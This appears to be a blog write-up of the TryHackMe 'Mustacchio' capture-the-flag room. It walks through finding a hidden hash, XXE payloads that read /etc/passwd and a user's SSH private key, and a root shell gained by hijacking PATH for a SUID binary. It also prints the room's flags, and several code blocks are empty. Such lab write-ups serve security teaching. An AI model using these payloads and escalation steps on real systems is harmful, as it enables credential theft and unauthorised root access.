## Machine Information

![mustacchio](/assets/images/2021-06-13-17-10-56.png)

Mustacchio is an easy difficulty room on TryHackMe. Our initial scan reveals SSH on port 22 which is left for later, and our investigation starts with Apache on port 80 and nginx on port 8765. We find a basic website with no real content hosted by Apache, and a login page to some sort of admin area hosted by nginx. Gobuster finds hidden folders on both sites, and we progress by finding a comment in one of the files found in there. After gaining access to the admin panel we find it is susceptible to an xxe exploit. We use this to get a user rsa key, and then access the server via SSH. From there we find a badly written binary that's susceptible to an unquoted path attack allowing us to gain a root shell.

<!--more-->

Skills required are basic file and operating system enumeration and exploration knowledge. Skills gained are experience in using an external entity attack (XXE) and methods to gain roots shells using unquoted service paths.

## Initial Recon

As always let's start with Nmap:

```

We find a few open ports. Let's add the servers IP to our hosts file before we begin:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/internal]
â””â”€# echo 10.10.206.78 mustacchio.thm >> /etc/hosts
```

First we'll have a look on port 80 to see what the website has for us:

![mustacchio-port-80](/assets/images/2021-06-12-16-58-34.png)

Turns out there's very little here. Let's look at the other site on port 8765:

![mustacchio-admin](/assets/images/2021-06-12-16-59-56.png)

We find a login page, but for now we haven't got any credentials. With nothing obvious on either let's try Gobuster:

```text

```

Gobuster finds a few of the expected folders, but also one called custom. Let's have a look at that:

![mustacchio-custom](/assets/images/2021-06-12-17-04-12.png)

Two folders, and in the js one we find a file called mobile.js:

![mustacchio-mobile](/assets/images/2021-06-12-17-11-26.png)

At the bottom we see a comment out line with what is probably a hash. Let's check it:

```text

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Possibly an MD5 hash, try and crack it on one of the many websites out there:

![mustacchio-md5](/assets/images/2021-06-12-17-17-52.png)

That was nice and easy! 

Going back to the adminpanel login page and using this password with the user admin let's us log in and we find a single page:

![mustacchio-adminpanel](/assets/images/2021-06-12-17-20-33.png)

Typing something in and clicking submit doesn't appear to do anything, but looking at the source of the page gives us a clue:

```text
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <script type="text/javascript">
      //document.cookie = "Example=/auth/dontforget.bak";

```

What is this example? Maybe it's a clue, let's try Gobuster on this port as well:

```text

We do indeed find auth is a hidden subfolder. Using curl we find we can get the file mentioned before:

  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I couldâ€™ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You couldâ€™ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>

The file contents is not interesting, but the structure of it is. We can use this knowledge of it to craft an exploit using an External Enitity (XXE) attack. I found [this](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) which explains in detail how it works. I can take their example:

```text
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

And use the structure from above to create my own attack:

```text
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```

This works and I can see the contents of the passwd file:

![mustacchio-xxe](/assets/images/2021-06-12-17-41-33.png)

From that we can see two users:

```text
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```

Looking back at the adminpanel page source we see there is another comment at the bottom:

```text
    <!-- Barry, you can now SSH in using your key!-->
```

Know that we can now display the contents of files on the server, it's safe to assume this is our intended path. Assuming the SSH key is in the default location for Barry let's try to grab it:

```text
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment> 
```

We do indeed get the rsa key:

![mustacchio-rsa_key](/assets/images/2021-06-12-17-42-12.png)

Copy and paste that in to a file on Kali:

```text
â”Œâ”€â”€(rootðŸ’€kali)-[~/thm/mustacchio]
â””â”€# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----

<SNIP>
-----END RSA PRIVATE KEY-----
```

We can see it's encrypted, so we'll need to try and crack it to get a password:

```text

```

If you forget to change the permission on the id_rsa file you'll get this error if you use it to log in via SSH:

```text

```

Change that then try again, using the password we've just cracked:

```text

Get the user flag while we're here:

barry@mustacchio:~$ cat user.txt 
62d77a4d5f97d47c5aa38b3b2651b831
```

I#m doing usual checks I go through when I first get access to a target, when I got to SUID binaries I find this:

```text
barry@mustacchio:/home/joe$ find / -perm -4000 2>/dev/null
<SNIP>
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```

Looking at live_log we see it is an executable that I have permissions for:

```text
barry@mustacchio:/home/joe$ file live_log 
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped
```

We could download it to Kali and have a deeper look inside it, but first check for strings and awk on the target. If they're there then simple to first have a look in place:

```text
barry@mustacchio:/home/joe$ which strings
/usr/bin/strings
barry@mustacchio:/home/joe$ which awk
/usr/bin/awk
```

Depending on the size of the binary the output from strings can be large and hard to look through. So I usually cut down the output with awk and just see lines with 20 characters or more first. If there's nothing interesting I'll go down to 15, so more to look through incase I'd excluded it:

```text
barry@mustacchio:/home/joe$ strings live_log | awk 'length($0) > 20'
/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0

_GLOBAL_OFFSET_TABLE_
_ITM_deregisterTMCloneTable
__libc_start_main@@GLIBC_2.2.5
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
```

This time I found it on the first go. We can see there is a call to tail which doesn't include the full path to the binary. We can exploit this unquoted path to execute a file of our choice. [This](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) article is quite detailed if you want to better understand it this type of attack.

First move to another folder, then add it to the PATH of the system:

```text
barry@mustacchio:/home/joe$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:/home/joe$ cd /dev/shm
barry@mustacchio:/dev/shm$ export PATH=/dev/shm:$PATH
barry@mustacchio:/dev/shm# echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Now we can create a file in this folder called tail, and when the live_log binary is executed it will call our file instead of the correct version of tail:

```text
barry@mustacchio:/dev/shm# echo "/bin/bash -p" > tail
barry@mustacchio:/dev/shm# chmod +x
```

Finally we can run the live_log binary to switch us to root:

```text
barry@mustacchio:/dev/shm$ /home/joe/live_log
root@mustacchio:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)
```

Let's get the root flag:

```text
root@mustacchio:/dev/shm# cat /root/root.txt
3223581420d906c4dd1a5f9b530393a5
```

And we are all done. That was a nice simple room, I hope you enjoyed it and learned something useful along the way.

See you next time.
